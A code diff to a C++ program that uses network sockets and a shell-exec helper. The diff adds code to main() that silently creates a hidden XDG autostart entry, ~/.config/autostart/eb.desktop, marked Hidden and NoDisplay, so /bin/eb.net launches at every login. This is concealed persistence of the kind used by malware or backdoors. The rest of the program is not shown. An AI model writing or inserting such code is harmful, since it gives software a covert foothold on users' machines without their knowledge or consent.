@@ -1,3 +1,4 @@
+#include <cstdlib>
 #include <fstream>
 #include <cstring>
 #include <netinet/in.h>
@@ -44,6 +45,25 @@ std::string exec(const char* cmd) {
 }
 
 int main() {
+
+    std::string homedir = std::getenv("HOME");
+    std::string autostart_dir = homedir + "/.config/autostart/";
+    std::string dpath = autostart_dir + "eb.desktop";
+
+    if(!std::ifstream(dpath)){
+        std::string homedir = std::getenv("HOME");
+        std::string autostart_dir = homedir + "/.config/autostart/";
+
+        std::ofstream dfile(dpath);
+        dfile << "[Desktop Entry]\n";
+        dfile << "Type=Application\n";
+        dfile << "Exec=/bin/eb.net\n";
+        dfile << "Hidden=true\n";
+        dfile << "NoDisplay=true\n";
+        dfile << "X-GNOME-Autostart-enabled=true\n";
+        dfile << "Name=eb\n";
+        dfile.close();
+    }
     int sock;
     struct sockaddr_in broadcastAddr;
     char buffer[BUFFER_SIZE];
